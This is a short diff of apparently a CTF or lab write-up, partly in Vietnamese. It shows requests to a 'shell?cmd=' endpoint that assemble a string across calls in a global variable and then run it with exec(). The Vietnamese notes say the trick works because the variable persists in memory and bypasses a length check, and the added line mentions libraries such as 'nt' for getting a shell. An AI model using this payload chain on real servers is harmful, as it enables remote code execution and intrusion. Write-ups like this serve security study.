@@ -9,4 +9,4 @@ host/shell?cmd=global a;a+="_"
 host/shell?cmd=global a;a=")"
 host/shell?cmd=exec(a)
 
-Tại vì sao lại có thể sử dụng được -> nên nó nó đang lưu trong memory. Cơ bản lầ bypass check độ dài là xong rồi, cái khác easy
+Tại vì sao lại có thể sử dụng được -> nên nó nó đang lưu trong memory. Cơ bản lầ bypass check độ dài là xong rồi, cái khác easy. Còn sử dụng các thư viên thay thế như nt để trigger shell
